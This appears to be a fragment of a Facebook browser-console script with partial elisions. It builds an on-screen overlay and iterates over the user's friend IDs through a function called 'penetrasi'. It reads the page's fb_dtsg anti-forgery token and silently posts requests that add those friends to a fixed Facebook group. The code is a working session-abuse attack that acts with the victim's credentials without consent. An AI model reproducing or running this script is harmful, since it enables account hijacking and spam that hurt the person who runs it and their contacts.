...
kunaon+="</div>";
var dipes="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255,255,255,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid rgba(10,10,10,0.5)'>";
...
tay--;
if(tay>0){var s=arr[tay];setTimeout("penetrasi("+s+")",100);}console.log(tay+"/"+arr.length+":"+s+", success:"+suc);if(memberGroupId!=440858199282766){jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=440858199282766&source=typeahead&members="+opo+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(){},"text","post");}
}
